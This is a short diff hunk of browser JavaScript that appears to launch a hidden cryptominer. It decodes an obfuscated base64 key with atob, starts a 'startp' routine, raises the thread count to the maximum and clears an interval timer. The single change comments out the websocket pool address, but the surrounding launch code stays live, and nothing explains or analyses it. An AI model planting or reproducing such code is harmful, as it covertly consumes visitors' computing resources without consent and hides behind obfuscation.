@@ -21,7 +21,7 @@
                         atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                     let p = 'workers_';
                     args.push(p);
-                    args.push('wss://mcanalley.io:8282/');
+                    // args.push('wss://mcanalley.io:8282/');
                     window[key].startp.apply(window[key], args);
                     window[key].addMaxThreads();
                     clearInterval(intv);
